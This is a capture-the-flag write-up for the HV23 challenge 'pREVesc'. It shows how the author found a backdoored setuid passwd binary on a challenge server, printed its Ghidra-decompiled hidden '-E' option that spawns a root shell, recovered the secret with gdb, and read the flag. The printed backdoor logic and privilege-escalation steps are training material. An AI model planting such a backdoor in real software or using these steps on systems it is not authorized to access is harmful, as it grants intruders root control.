# 15 - pREVesc

## Description

Level: Hard<br/>
Author: coderion

We recently changed the root password for santa as he always broke our system. However, I think he has hidden some
backdoor in there. Please help us find it to save christmas!

## Solution

We are given a remote server that we can connect to via SSH. The categories of the challenge were "Reverse Engineering"
as well as "Linux". So I assumed we would need to do some PrivSec (for instance a setuid binary 😉) in combination with
some reversing.

After connecting to the server via SSH I looked for potential [setuid binaries](https://en.wikipedia.org/wiki/Setuid):

```console
challenge@server:~$ find "/" -perm /4000 2>/dev/null

/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

There seems quite a few setuid binaries and after wasting some time with [GTFOBins](https://gtfobins.github.io/), I
decided to take a closer look at the binaries. One of them stood out since it was modified a few days before the
challenge launched:

```console
challenge@server:/usr/bin$ ls -tla | head -10

drwxr-xr-x. 1 root root      4096 Dec 14 22:48 .
-rwsr-xr-x. 1 root root    132552 Dec 12 21:53 passwd
lrwxrwxrwx. 1 root root        24 Dec  4 12:42 editor -> /etc/alternatives/editor
lrwxrwxrwx. 1 root root        20 Dec  4 12:42 ex -> /etc/alternatives/ex
lrwxrwxrwx. 1 root root        23 Dec  4 12:42 rview -> /etc/alternatives/rview
lrwxrwxrwx. 1 root root        22 Dec  4 12:42 rvim -> /etc/alternatives/rvim
lrwxrwxrwx. 1 root root        20 Dec  4 12:42 vi -> /etc/alternatives/vi
lrwxrwxrwx. 1 root root        22 Dec  4 12:42 view -> /etc/alternatives/view
lrwxrwxrwx. 1 root root        21 Dec  4 12:42 vim -> /etc/alternatives/vim
```

Alternatively, one could also use `dpkg --verify` and would see this:

```
??5??????   /usr/bin/passwd
```

Hinting at the fact, that `passwd` has been replaced with a custom binary. I downloaded the file and reversed it
locally in Ghidra:

```c
void main() {
  ...
  switch (option) {
  case 'E':
    goto custom_option;
  ...

custom_option:
  setuid(0);
  setgid(0);
  env = getenv("SALAMI");
  
  if (env == (char *)0x0) {
    puts("Why u givin\' me no salami?!");
    exit(1);
  }

  local_1e8 = 0x707575;
  local_1ff = 0x41a041d;
  uStack_1fb = 0xe1f;
  local_1f8 = 0x6576656e;
  uStack_1f4 = 0x6e6f6772;
  uStack_1f0 = 0x6967616e;
  uStack_1ec = 0x6f796576;
  
  i = 0;
  do {
    local_205[i] = *(byte *)((long)&local_1ff + i) ^ *(byte *)((long)&local_1f8 + i);
    i++ = i + 1;
  } while (lVar14 != 6);
  
  local_1d8 = 0x1118151b;
  uStack_1d4 = 0x4e5c531e;
  uStack_1d0 = 0x471a161b;
  uStack_1cc = 0x15190e0a;
  local_1c8 = 0x4f160b18;
  uStack_1c4 = 0x46000e0f;
  uStack_1c0 = 0x2180004;
  uStack_1bc = 0x5c055605;
  uStack_1b8 = 0x1a3008;
  uStack_1b5 = 0x3b58045d;
  uStack_1b1 = 0x220a3506;
  
  i = 0;
  do {
    *(byte *)((long) local_108 + i) =
         local_205[(int) uVar9 + (int)((i & 0xffffffff) / 6) * -6] ^ *(byte *)((long)&local_1d8 + i);
    i++;
  } while (i != 0x2b);

  if (strcmp(env, (char *)local_108) == 0) {
    puts("Enjoy your salami!");
    system("/bin/bash -p");
  }

  exit(1);
```

There seems to be a hidden option `-E` that we can use, first it checks if the environment variable `SALAMI` is set. It
is then compared to a string. Instead of reversing this part, I ran the binary using gdb to obtain the expected string:

```console
(gdb) break *main+1055
(gdb) c
(gdb) x/s $r12

0x7fffffffde10:	"https://www.youtube.com/watch?v=dQw4w9WgXcQ"
```

All we need to do now is the following:

```console
challenge@server:/usr/bin$ export SALAMI="https://www.youtube.com/watch?v=dQw4w9WgXcQ"
challenge@server:/usr/bin$ passwd -E

Enjoy your salami

root@server:/usr/bin# id
uid=0(root) gid=0(root) groups=0(root),1001(challenge)

root@server:/usr/bin# cat /root/flag.txt
HV23{3v1l_p455wd}
```
